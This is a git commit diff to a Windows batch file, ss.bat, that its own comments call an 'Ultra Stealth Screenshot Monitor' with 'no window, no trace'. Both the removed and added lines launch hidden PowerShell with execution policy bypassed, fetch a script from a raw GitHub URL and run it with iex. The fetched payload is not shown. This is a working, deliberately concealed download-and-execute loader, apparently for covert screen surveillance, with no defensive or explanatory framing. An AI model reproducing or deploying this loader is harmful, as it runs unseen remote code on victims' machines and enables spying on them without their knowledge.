b743bc9d3aa48f396b4d6f724bc3357571833739
Axolotl-in-void <gh266566@gmail.com>
2026-05-22 17:26:45 +0200

    Update ss.bat

--- ss.bat
+++ ss.bat
@@ -1,13 +1,10 @@
 @echo off
 setlocal
 
-:: Ultra Stealth Screenshot Monitor
-:: No window, no minimize, no trace
-
+:: === ULTRA STEALTH MODE - NO WINDOW EVER ===
 set "url=https://raw.githubusercontent.com/Axolotl-in-void/powerhell/main/file.ps1"
 
-:: Run completely hidden and detached
 powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
-"Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"$content = (Invoke-WebRequest ''%url%'' -UseBasicParsing).Content; iex $content\"' -WindowStyle Hidden -NoNewWindow" >nul 2>&1
+"Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"iex (iwr ''%url%'' -UseBasicParsing).Content\"' -PassThru" >nul 2>&1
 
 exit
